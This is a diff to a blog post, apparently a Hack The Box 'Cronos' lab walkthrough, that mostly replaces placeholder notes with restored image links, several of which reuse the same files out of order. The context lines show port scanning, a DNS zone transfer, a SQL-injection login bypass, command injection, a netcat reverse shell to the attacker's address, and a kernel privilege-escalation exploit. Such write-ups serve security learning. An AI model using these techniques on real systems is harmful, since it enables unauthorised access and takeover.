@@ -9,11 +9,7 @@ date: "2019-03-15"
 lastmod: "2026-08-08"
 ---
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![AEpKkq.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ad952f5d4c98.png)
 
 ## Introduction
 
@@ -29,11 +25,7 @@ Firstly, detect the open ports:
 nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
 ```
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![AE1qlF.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/2b1609a58acc.png)
 
 3 ports is open, detect the detailed services:
 
@@ -41,11 +33,7 @@ nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
 namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13
 ```
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![AE1OOJ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/15fe51ea9188.png)
 
 So we can conduct the relation of ports of ports and services as following:
 
@@ -61,11 +49,7 @@ port|service
 
 As the target machine provides http service, try to access `http://10.10.10.13`
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![AE3V0A.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d432e4592c5c.png)
 
 Default apache web page, nothing new. So try to brute force `http://10.10.10.13/` with dirbuster. After brute force for a period time, we have not found anything new.
 
@@ -77,11 +61,7 @@ As the target machine owns DNS service. It is common to check zone transfer with
 dig axfr @10.10.10.13 cronos.htb
 ```
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![AE3ZTI.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/826aa2aca8fb.png)
 
 An interestring domain name `admin.cronos.htb` is found. So add an entry into `/etc/hosts`:
 
@@ -91,17 +71,11 @@ An interestring domain name `admin.cronos.htb` is found. So add an entry into `/
 
 Try to access `admin.cronos.htb` in the browser, a login web page is displayed. Yep, it is what we want. It seems that the login is quite simple. Try to login with sql injection with the username of `admin ' or '1' = '1`, the password can be anything.
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
+![AEpKkq.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ad952f5d4c98.png)
 
 Magic! We are in. It seems that it is a network tool. However, it seems that it has exposed the ability to execute command remotely. Have a test of `8888&whoami`:
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![AE1qlF.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/2b1609a58acc.png)
 
 The result is `www-data`. Obviously, the command can executed properly. Now try to reverse the shell. Try to listen to port `1234` by nc in our kali:
 
@@ -117,11 +91,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f
 
 Wait for server second, shell is return. Wonderful!
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![AE1OOJ.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/15fe51ea9188.png)
 
 Try to obtain a tty terminal:
 
@@ -141,11 +111,7 @@ uname -a
 
 Google linux kernel privilege escalation, find a [payload](https://www.exploit-db.com/exploits/44298)
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![AE3V0A.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d432e4592c5c.png)
 
 Server a http server to provide the payload, name it as exploit.c:
 
@@ -180,11 +146,7 @@ chmod +x exploit
 
 Just execute it by `./exploit`. Wow, now see whoami.
 
-
-
-> **（原外链配图已失效移除，请以正文说明为准）**
-
-
+![AE3ZTI.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/826aa2aca8fb.png)
 
 ## Conclusion
 
